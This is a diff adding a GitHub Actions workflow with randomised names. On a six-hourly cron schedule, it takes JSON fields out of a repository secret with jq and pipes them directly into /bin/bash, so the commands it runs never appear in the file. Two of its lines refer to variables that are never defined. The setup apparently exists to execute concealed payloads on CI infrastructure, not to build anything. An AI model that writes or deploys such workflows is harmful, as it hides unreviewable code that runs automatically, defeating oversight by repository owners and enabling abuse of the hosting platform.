@@ -1,0 +1,19 @@
+name: fanggeju4567
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '37 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanggeju4567
+        env:
+          ytzuc73: ${{ secrets.ytzuc73 }}
+        run: |
+          echo $ytzuc73 | jq -r .e4 | /bin/bash
+          echo $ivqs98 | jq -r .xa54375 | /bin/bash
+          echo $fu61 | jq -r .jmcdj222 | /bin/bash
+
